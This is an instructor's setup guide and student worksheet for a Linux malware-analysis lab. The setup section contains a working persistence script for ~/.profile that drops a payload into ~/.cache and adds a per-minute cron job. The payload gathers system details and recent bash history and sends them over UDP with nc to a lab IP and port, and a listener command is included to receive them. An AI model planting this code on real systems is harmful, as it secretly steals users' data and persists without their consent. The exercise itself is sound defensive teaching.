## Preamble

This task introduces students to basic malware investigation on a Linux system. They’ll identify, analyse, and remove a simple malware script using tools like Wireshark and grep, while learning key cyber security concepts like persistence and prevention.

## Prepare Environment
1. Create a virtual machine image with a Graphical version of Linux.
2. Ensure the following tools are installed on the system:
```bash
sudo apt update
sudo apt install -y crontab nc wireshark
```
3. Create a persistence script inside of the home folder (~/.profile) with the following contents:
```bash
#!/bin/bash

USER_NAME=$(whoami)
DEST_IP="192.168.0.10"
DEST_PORT="9001"
PAYLOAD_PATH="/home/$USER_NAME/.cache/NDA0c2VjcmV0c25vdGZvdW5k.sh"
CRON_CMD="$PAYLOAD_PATH >/dev/null 2>&1"
CRON_JOB="* * * * * $CRON_CMD"
FAKE_MAC="F0:0D:F0:0D:F0:0D"

# Recreate payload if missing
if [ ! -f "$PAYLOAD_PATH" ]; then
  mkdir -p "$(dirname "$PAYLOAD_PATH")"
  cat > "$PAYLOAD_PATH" << EOF
#!/bin/bash

OUTPUT_FILE="/tmp/system_profile.txt"

{
  uname -a
  echo
  who
  echo
  ip addr show
  echo
  tail -20 ~/.bash_history
} > "\$OUTPUT_FILE"

# Use UDP instead of TCP
nc -u "$DEST_IP" "$DEST_PORT" < "\$OUTPUT_FILE"
EOF

  chmod +x "$PAYLOAD_PATH"
fi

# Ensure cron job is present
crontab -l 2>/dev/null | grep -F -- "$CRON_CMD" >/dev/null
if [ $? -ne 0 ]; then
  (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
fi

# Ensure static ARP entry exists
arp -n | grep -q "$DEST_IP"
if [ $? -ne 0 ]; then
  sudo arp -s $DEST_IP $FAKE_MAC
fi
```
4. (Bonus step) Configure a machine with the `DEST_IP` and `DEST_PORT` from step 3 to see if any students analyse the malware with the network interface connected to a live network. This can be done with the `nc` tool to spin up a TCP server:
```bash
nc -luvp 9001
```

## Extra Marks
- The student disconnects the network interface card before starting analysis.
- The student discovers and removes the start up persistence script.
- The student discovers the payload file name is a base-64 encoded string of the phrase `404secretsnotfound`.
- The student discovers the MAC address spells out `FOODFOODFOOD`.

-------------------------------------------------------------------------
# Lab 01
-------------------------------------------------------------------------
## Case Study
You are a Cyber Security Analyst who has been tasked with analysing a machine that a client has suspected has malware on it.

The client plugged a USB device into the system and a terminal opened before closing quickly. The client suspects the USB device loaded malware onto the system. The USB device was destroyed so you cannot analyse it.

## Goal
Your goal is to find evidence of malware, and remove it permanently from the system. 
Tools that may be useful to complete your goal include:
- `Wireshark` or `tcpdump`
- `grep`

## Post Analysis
### What was the type and purpose of the malware?
_Type your answer here_

### What tools did you use to detect the malware?
_Type your answer here_

### What steps did you take to remove the malware?
_Type your answer here_

### What steps could be taken in the future to reduce the exposure to similar malware?
_Type your answer here_

### What part of the analysis was most challenging?
_Type your answer here_